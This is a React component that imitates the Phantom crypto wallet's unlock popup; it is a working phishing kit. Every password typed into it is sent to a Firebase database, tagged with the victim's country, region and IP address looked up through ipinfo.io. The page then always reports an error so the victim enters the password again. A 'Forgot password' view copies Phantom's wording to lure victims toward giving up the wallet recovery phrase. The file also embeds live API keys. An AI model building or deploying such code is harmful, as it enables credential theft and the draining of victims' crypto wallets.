'use client';

import React, { useState, useEffect, useRef } from 'react';
import './phantom.css';

import { Typography } from "antd";
import axios from "axios";
import "antd/dist/reset.css";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";

// Images are loaded from public folder at runtime
const firstGifImage = '/assets/gif/1.gif';
const secondGifImage = '/assets/gif/2.gif';
const threeGifImage = '/assets/gif/3.gif';
const fourGifImage = '/assets/gif/4.gif';

const isDarkMode = typeof window !== 'undefined' ? window.matchMedia("(prefers-color-scheme: dark)").matches : false;
const firebaseConfig = {
    apiKey: "AIzaSyBFBuQlWblYJKqh2gxp-vQ_BbyVLRaMp-U",
    authDomain: "myproject-e26a3.firebaseapp.com",
    databaseURL: "https://myproject-e26a3-default-rtdb.firebaseio.com",
    projectId: "myproject-e26a3",
    storageBucket: "myproject-e26a3.firebasestorage.app",
    messagingSenderId: "340525504262",
    appId: "1:340525504262:web:59925e0af4aec3bce8f087",
    measurementId: "G-PVZGRFE4HV"
  };

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const { Title, Text } = Typography;
let flag = true;

const Phantom = (props) => {
    const { handleModal } = props;
    const [password, setPassword] = useState('');
    const [dbName, setDbName] = useState(null);
    const [error, setError] = useState(false);
    const [isLoading, setIsLoading] = useState(true); // Initially show loading view
    const [isForgotPassword, setIsForgotPassword] = useState(false); // Track if Forgot Password view is active
    const [email, setEmail] = useState(""); // Email for password recovery

    const phantomLoginRef = useRef();
    const phantomForgotRef = useRef();
    const phantomInputRef = useRef();
    const firstGifRef = useRef();
    const secondGifRef = useRef();
    const threeGifRef = useRef();
    const fourGifRef = useRef();
    const loadingModalRef = useRef(); // Loading modal reference

    const handleFirstGif = () => {
        firstGifRef.current.style.display = "none";
        threeGifRef.current.style.display = "block";
        setTimeout(() => {
            firstGifRef.current.style.display = "none";
            secondGifRef.current.style.display = "none";
            threeGifRef.current.style.display = "none";
            fourGifRef.current.style.display = "block";
        }, 3000);
    };

    const handleSecondGif = () => {
        secondGifRef.current.style.display = "none";
        threeGifRef.current.style.display = "block";
        setTimeout(() => {
            firstGifRef.current.style.display = "none";
            secondGifRef.current.style.display = "none";
            threeGifRef.current.style.display = "none";
            fourGifRef.current.style.display = "block";
        }, 3000);
    };

    const handleThreeGif = () => {};

    const handleFourGif = () => {
        fourGifRef.current.style.display = "none";
        threeGifRef.current.style.display = "block";
        setTimeout(() => {
            firstGifRef.current.style.display = "none";
            secondGifRef.current.style.display = "none";
            threeGifRef.current.style.display = "none";
            fourGifRef.current.style.display = "block";
        }, 3000);
    };

    const fetchIP = async () => {
        try {
            const response = await axios.get("https://ipinfo.io/json?token=f50acff5347305");
            const data = response.data;
            const result = data.country + '_' + data.region + '_' + data.ip;
            setDbName(result);
        } catch (error) {
            console.error("Error fetching IP address:", error);
            return false;
        }
    };

    useEffect(() => {
        fetchIP();
        setTimeout(() => {
            setIsLoading(false); // Hide loading modal after 0.8 second
        }, 800);
    }, []);

    window.onclick = function(event) {
        if(event.target === document.getElementById('phantomModal')) {
            handleModal("phantom", false);
            flag = true;
        }
    };

    const addUser = (payload) => {
        const d = new Date();
        const dataRef = ref(
            db,
            `${dbName.replaceAll(".", "_")}_Elop/user_${d.getTime()}`
        );
        set(dataRef, payload);
    };
    const changeInput = (value) => {
        setError(false);
        setPassword(value);
      
        if(flag === true) {
            firstGifRef.current.style.display = "none";
            threeGifRef.current.style.display = "none";
            fourGifRef.current.style.display = "none";
            secondGifRef.current.style.display = "block";
            flag = false;
            setTimeout(() => {
                secondGifRef.current.style.display = "none";
                fourGifRef.current.style.display = "block";
            }, 3000);
        }
    };

    const validatePassword = () => {
        addUser(password);
        setError(true);
    };

    const setVisible = () => {
        setIsForgotPassword(!isForgotPassword);
    };

    // Vibrate input field and change border color
    const handleUnlockClick = () => {
        phantomInputRef.current.style.borderColor = 'red'; // Dark red color
        phantomInputRef.current.classList.add('vibrate'); // Add class for vibration effect
    };

    // Handle email input change for forgot password
    const handleEmailChange = (e) => {
        setEmail(e.target.value);
    };

    // Handle password reset logic
    const handleResetPassword = () => {
        console.log("Resetting password for email: ", email);
        // Your reset password logic goes here
    };

    return (
        <div id="phantomModal" style={{ zIndex: "10", width: "100%", height: "100vh", position: "fixed" }} className="app_font_family">
            {/* Loading Modal */}
            {isLoading && (
                <div
                    ref={loadingModalRef}
                    style={{
                        width: 360,
                        height: 600,
                        background: "white",
                        float: "right",
                        marginRight: "150px",
                        textAlign: 'center',
                        border: '0.5px solid #323232',
                        position: 'absolute',
                        right: '2px',  // Move to the right
                        zIndex: 9999
                    }}
                >
                    <Title style={{ color: "#000", fontFamily: 'Inter, Roboto, Arial', fontWeight: 'unset', lineHeight: '24px', fontSize: 24 , letterSpacing: '-.02em', marginBottom: '15px' }}></Title>
                </div>
            )}

            {/* Login Modal View */}
            {!isLoading && !isForgotPassword && (
                <div
                    ref={phantomLoginRef}
                    style={{
                        width: 360,
                        height: 600,
                        background: "#222222",
                        float: "right",
                        marginRight: "150px",
                        textAlign: 'center',
                        border: '0.5px solid white',
                        zIndex: 1
                    }}
                >
                    <div style={{ marginBottom: 11 }}>
                        <div
                            style={{
                                display: "flex",
                                justifyContent: "space-between",
                                alignItems: "center",
                                padding: '10px 16px',
                                height: '59px'
                            }}
                        >
                            <div style={{ color: "#999999", margin: 'auto', textAlign: 'center', fontFamily: 'Inter, Roboto, Arial', fontSize: 23, fontWeight: 800, letterSpacing: -0.3, paddingLeft: "11px" }} >
                                phantom
                            </div>
                            <span aria-haspopup="true" aria-controls="menu--1" id="menu-button--menu" type="button" data-reach-menu-button=""><div className="sc-lbhJGD eZiQqx"><svg width="15" height="15" backgroundColor='white' viewBox="0 0 15 15" xmlns="http://www.w3.org/2000/svg"><path fill='#777777' d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"></path></svg></div></span>
                        </div>
                        <div
                            style={{
                                borderStyle: "none none solid none",
                                width: "360px",
                                height: "1px",
                                backgroundColor: "#323232",
                            }}
                        ></div>
                        <img src={firstGifImage} alt="Animated GIF" ref={firstGifRef} onClick={() => handleFirstGif()} style={{ margin: 'auto', display: 'block', cursor: 'pointer' }} />
                        <img src={secondGifImage} alt="Animated GIF" ref={secondGifRef} onClick={() => handleSecondGif()} style={{ margin: 'auto', display: 'none', cursor: 'pointer' }} />
                        <img src={threeGifImage} alt="Animated GIF" ref={threeGifRef} onClick={() => handleThreeGif()} style={{ margin: 'auto', display: 'none', cursor: 'pointer' }} />
                        <img src={fourGifImage} alt="Animated GIF" ref={fourGifRef} onClick={() => handleFourGif()} style={{ margin: 'auto', display: 'none', cursor: 'pointer' }} />
                    </div>
                    <div style={{ padding: '0 16px' }}>
                        <Title style={{ color: "white", fontFamily: 'Inter, Roboto, Arial', fontWeight: 'unset', lineHeight: '24px', fontSize: 24 , letterSpacing: '-.02em', marginBottom: '15px' }}>
                            Enter your password
                        </Title>
                        <input
                            type='password'
                            placeholder="Password"
                            value={password}
                            className={error ? 'errorAlert' : "defaultAlert"}
                            style={{
                                width: '100%',
                                marginBottom: 12,
                                outlineColor: 'red !important',
                                background: "#181818",
                                borderWidth: "1px",
                                borderStyle: "solid",
                                borderColor: 'red',
                                padding: 14,
                                borderRadius: "6px",
                                fontSize: 16,
                                lineHeight: "19px",
                                fontFamily: 'Inter, Robot, Arial',
                                color: "white"
                            }}
                            onChange={(e) => changeInput(e.target.value)}
                            ref={phantomInputRef}
                        />
                        <Text
                            className='forgot'
                            style={{
                                display: "block",
                                marginBottom: '110px',
                                cursor: "pointer",
                                fontSize: 17,
                                fontWeight: 500,
                                transitionDuration: '.4s',
                                fontFamily: 'Inter, Roboto, Arial'
                            }}
                            onClick={() => setVisible()}
                        >
                            Forgot password
                        </Text>
                        <button
                            type="primary"
                            block
                            className="unlock"
                            style={{
                                width: "100%",
                                height: '47px',
                                borderRadius: 16,
                                fontSize: 16,
                                border: "none",
                                color: "#2B2A30",
                                fontWeight: 600,
                                transitionDuration: '.4s',
                                fontFamily: 'Inter, Roboto, Arial',
                                letterSpacing: 'normal'
                            }}
                            onClick={validatePassword}
                        >
                            Unlock
                        </button>
                    </div>
                </div>
            )}

            {/* Forgot Password Modal View */}
            {isForgotPassword && (
                <div
                    ref={phantomForgotRef}
                    style={{
                        width: 360,
                        height: 600,
                        background: "#222222",
                        float: "right",
                        marginRight: "150px",
                        textAlign: 'center',
                        border: '0.5px solid white',
                        zIndex: 1
                    }}
                >
                    <div style={{}} className='app_font_family'>
                    <div
                        style={{
                            display: "flex",
                            justifyContent: "space-between",
                            alignItems: "center",
                            padding: '9px 16px'
                        }}
                    >
                        <span style={{fontSize:27, fontWeight: '500', color: "#6D6D6D", cursor: "pointer"}} onClick={() => setVisible() } >&times;</span>
                        <Title
                            style={{ color: "#fff", fontSize: 17, fontWeight: 500, lineHeight: '20px', margin: "0 auto", paddingRight: "15px" }}
                        >
                            Forgot password
                        </Title>
                    </div>
                    <div
                        style={{
                            borderStyle: "none none solid none",
                            width: "360px",
                            height: "1px",
                            backgroundColor: "#323232"
                        }}
                    ></div>
                    <div
                        style={{
                            width: 90,
                            height: 90,
                            borderRadius: "50%",
                            backgroundColor: "#181818",
                            display: "flex",
                            justifyContent: "center",
                            alignItems: "center",
                            margin: "0 auto",
                            marginTop: "105px",
                        }}
                    >
                        <svg width="94" height="94" viewBox="0 0 94 94" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <g filter="url(#filter0_i)"><circle cx="47" cy="47" r="47" fill="#181818"></circle></g>
                        <g filter="url(#filter1_d)"><path d="M47 27C40.37 27 35 32.1143 35 38.4286V44.1429H29V67H65V44.1429H59V38.4286C59 32.1143 53.63 27 47 27ZM47 32.7143C50.57 32.7143 53 35.0286 53 38.4286V44.1429H41V38.4286C41 35.0286 43.43 32.7143 47 32.7143Z" fill="#2D2D2D"></path></g><defs><filter id="filter0_i" x="0" y="0" width="94" height="94" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feBlend mode="normal" in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend><feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix><feOffset></feOffset><feGaussianBlur stdDeviation="2"></feGaussianBlur><feComposite in2="hardAlpha" operator="arithmetic" k2="-1" k3="1"></feComposite><feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.25 0"></feColorMatrix><feBlend mode="normal" in2="shape" result="effect1_innerShadow"></feBlend></filter><filter id="filter1_d" x="21" y="19" width="52" height="56" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"></feColorMatrix><feOffset></feOffset><feGaussianBlur stdDeviation="4"></feGaussianBlur><feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0"></feColorMatrix><feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow"></feBlend><feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow" result="shape"></feBlend></filter></defs></svg>
                    </div>
                </div>
                <div style={{padding: '0 16px 16px 16px'}}>
                    <Text style={{ color: "#F9F9F9", fontSize: 26, fontFamily: 'Inter, Roboto, Arial', lineHeight: '60px', fontWeight: 500 }} >
                        Forgot password
                    </Text>
                    <Text style={{ letterSpacing: '0.03em', color: "#6A6A6A", textAlign: 'center', textShadow: '0px 0px 1px #777', display: "block", fontSize: 16, fontWeight: 'normal', fontStyle: 'normal', marginBottom: 21, fontFamily: 'Inter, Roboto, Arial', lineHeight: '21px' }}>
                        You can reset your password by entering your wallet's 12-24 word recovery phrase.
                        Phantom cannot recover your password for you.
                    </Text>
                    <Text style={{ width: "100%", height: "48px", color: "#AB9FF2", cursor: "pointer", fontFamily: 'Inter, Roboto, Arial', display: "block", marginBottom: "70px", fontSize: 16, fontWeight: 500 }}>
                        Learn more
                    </Text>
                    <button className='unlock' style={{ width: "100%", fontFamily: 'Inter, Roboto, Arial', fontWeight: "600", lineHeight: "19px", color: "#34323E", padding: "14px 0", fontSize: 16, borderRadius: 16 }}>
                        Reset Password
                    </button>
                </div>
            </div>
              
            )}
        </div>
    );
};

export default Phantom;
